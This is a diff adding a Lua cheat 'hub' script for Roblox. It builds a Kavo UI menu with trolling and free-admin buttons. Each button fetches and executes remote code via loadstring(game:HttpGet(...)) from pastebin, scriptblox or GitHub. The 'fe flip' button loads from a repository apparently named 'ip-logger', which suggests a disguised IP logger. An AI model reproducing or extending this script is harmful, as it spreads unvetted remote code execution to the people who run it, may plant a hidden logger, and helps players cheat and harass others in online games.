@@ -1,0 +1,52 @@
+--also update it AND ADD THE OBBYS WHAT I GAVE BIRTH TO
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Obby creator hub           MADY BY HAXAREBEST1", "DarkTheme")
+local Tab = Window:NewTab("Main")
+local Section = Tab:NewSection("TROLL THESE NOOBS")
+
+
+-- WEBSITE DELETED IT RECREATE IT NOOB
+Section:NewButton("antivoid", "  ", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/bEWQXXMg"))();
+print("Clicked")
+end)
+
+
+
+
+local Tab = Window:NewTab("Admin scripts")
+local Section = Tab:NewSection("FREE ADMIN")
+Section:NewButton("infinite yield", "FREE ADMIN", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+print("Clicked")
+end)
+Section:NewButton("Nameless admin", "A NAMELESS ADMIN", function()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nameless-Admin-no-byfron-ui-11288"))()
+print("Clicked")
+end)
+local Tab = Window:NewTab("on / off")
+local Section = Tab:NewSection("on / off")
+Section:NewButton("keyboard", "keyboard", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+print("Clicked")
+end)
+local Section = Tab:NewSection("Open/close")
+Section:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.F, function()
+Library:ToggleUI()
+end)
+local Tab = Window:NewTab("Trolling")
+local Section = Tab:NewSection("GO TROLL THEM")
+Section:NewButton("fe ball roll", "be a ball in ohio", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/BZr9bGDy", true))()
+print("Clicked")
+end)
+Section:NewButton("fe flip", "flip like a oto!!1!1", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thiccnegative123/ip-logger/refs/heads/main/fe%20flip"))();
+print("Clicked")
+end)
+local Tab = Window:NewTab("CrEdIts")
+local Section = Tab:NewSection("MADE BY HAXAREBEST2")
+local Section = Tab:NewSection("i was kinda lazy making this script lol")
+local Section = Tab:NewSection("I MADE THE ANTI VOID SCRIPT NO HELP")
+local Section = Tab:NewSection("I FEEL SO SPECIAL")
